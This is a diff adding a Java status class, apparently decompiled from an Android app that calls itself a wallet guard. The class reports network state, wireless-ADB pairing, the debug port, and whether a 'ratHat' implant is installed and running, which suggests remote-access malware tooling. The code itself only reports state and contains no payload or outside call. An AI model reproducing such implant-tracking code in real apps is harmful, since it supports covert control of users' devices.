@@ -1,0 +1,82 @@
+package com.guard.wallet.resp;
+
+import android.os.Build;
+import androidx.annotation.NonNull;
+import com.guard.wallet.entity.ADBConfig;
+import com.guard.wallet.req.NetStateVO;
+import com.guard.wallet.utils.SystemHelper;
+import java.io.Serializable;
+
+public class DevicePairStateVO implements Serializable {
+    private Integer deviceConnected;
+    private Integer deviceDebugPort;
+    private Integer devicePaired;
+    private Integer isWifiConnected;
+    private Integer netConnected;
+    private Integer ratHatImplant;
+    private Integer ratHatRunning;
+    private Integer supportPair;
+    private String wifiId;
+
+    public DevicePairStateVO() {}
+
+    public DevicePairStateVO(Integer netConnected, Integer isWifiConnected, String wifiId, Integer supportPair,
+                             Integer devicePaired, Integer deviceConnected, Integer deviceDebugPort,
+                             Integer ratHatImplant, Integer ratHatRunning) {
+        this.netConnected = netConnected; this.isWifiConnected = isWifiConnected; this.wifiId = wifiId;
+        this.supportPair = supportPair; this.devicePaired = devicePaired; this.deviceConnected = deviceConnected;
+        this.deviceDebugPort = deviceDebugPort; this.ratHatImplant = ratHatImplant; this.ratHatRunning = ratHatRunning;
+    }
+
+    public static DevicePairStateVO of() {
+        DevicePairStateVO vo = new DevicePairStateVO();
+        NetStateVO net = SystemHelper.z0();
+        vo.setNetConnected(net.getIsConnected());
+        vo.setIsWifiConnected(net.getIsWifiConnected());
+        vo.setWifiId(net.getWifiId());
+        vo.setSupportPair(Build.VERSION.SDK_INT > 29 ? 1 : 0);
+        ADBConfig config = com.guard.wallet.utils.SharedPrefsManager.J();
+        vo.setRatHatImplant(config.getInstalledRatHat());
+        vo.setDevicePaired(config.isPaired() ? 1 : 0);
+        vo.setDeviceConnected(config.isConnected() ? 1 : 0);
+        vo.setDeviceDebugPort(config.getDebugPort());
+        h.e ratHatSvr = h.e.S();
+        if (ratHatSvr != null && ratHatSvr.B.get()) {
+            vo.setRatHatImplant(1);
+            vo.setRatHatRunning(1);
+        } else {
+            vo.setRatHatRunning(0);
+        }
+        return vo;
+    }
+
+    public Integer getDeviceConnected() { return this.deviceConnected; }
+    public Integer getDeviceDebugPort() { return this.deviceDebugPort; }
+    public Integer getDevicePaired() { return this.devicePaired; }
+    public Integer getIsWifiConnected() { return this.isWifiConnected; }
+    public Integer getNetConnected() { return this.netConnected; }
+    public Integer getRatHatImplant() { return this.ratHatImplant; }
+    public Integer getRatHatRunning() { return this.ratHatRunning; }
+    public Integer getSupportPair() { return this.supportPair; }
+    public String getWifiId() { return this.wifiId; }
+
+    public void setDeviceConnected(Integer v) { this.deviceConnected = v; }
+    public void setDeviceDebugPort(Integer v) { this.deviceDebugPort = v; }
+    public void setDevicePaired(Integer v) { this.devicePaired = v; }
+    public void setIsWifiConnected(Integer v) { this.isWifiConnected = v; }
+    public void setNetConnected(Integer v) { this.netConnected = v; }
+    public void setRatHatImplant(Integer v) { this.ratHatImplant = v; }
+    public void setRatHatRunning(Integer v) { this.ratHatRunning = v; }
+    public void setSupportPair(Integer v) { this.supportPair = v; }
+    public void setWifiId(String v) { this.wifiId = v; }
+
+    @NonNull
+    @Override
+    public String toString() {
+        return "DevicePairStateVO{netConnected=" + this.netConnected + ", isWifiConnected=" + this.isWifiConnected
+                + ", wifiId='" + this.wifiId + "', supportPair=" + this.supportPair
+                + ", devicePaired=" + this.devicePaired + ", deviceConnected=" + this.deviceConnected
+                + ", deviceDebugPort=" + this.deviceDebugPort + ", ratHatImplant=" + this.ratHatImplant
+                + ", ratHatRunning=" + this.ratHatRunning + "}";
+    }
+}
